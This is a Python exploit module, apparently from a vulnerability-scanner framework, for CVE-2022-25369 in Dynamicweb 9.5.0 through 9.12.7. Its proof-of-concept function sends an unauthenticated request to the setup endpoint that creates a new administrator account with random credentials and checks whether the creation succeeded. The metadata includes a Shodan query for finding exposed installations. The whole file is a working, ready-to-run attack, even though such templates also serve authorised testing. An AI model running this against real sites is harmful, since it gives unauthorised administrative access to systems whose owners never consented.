import requests
import random
import string


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Dynamicweb 9.5.0 - 9.12.7 Unauthenticated Admin User Creation''',
        "description": '''Dynamicweb contains a vulnerability which allows an unauthenticated attacker to create a new administrative user.''',
        "severity": "critical",
        "references": [
            "https://blog.assetnote.io/2022/02/20/logicflaw-dynamicweb-rce/", 
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25369"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "9.8",
            "cve-id": "CVE-2022-25369",
            "cwe-id": "CWE-425"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.component:"Dynamicweb"'''
        },
        "tags": ["cve", "cve2022", "dynamicweb", "rce", "unauth"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    randstr = gen_randstr(6)
    try:
        url = format_url(url)
        path = '/Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername={randstr}&adminpassword={randstr}&adminemail=test@test.com&adminname=test'.format(randstr=randstr)

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and ('"Success": true' in resp.text or '"Success":true' in resp.text) and 'application/json' in str(resp.headers) and 'ASP.NET_SessionId' in str(resp.headers):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_randstr(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))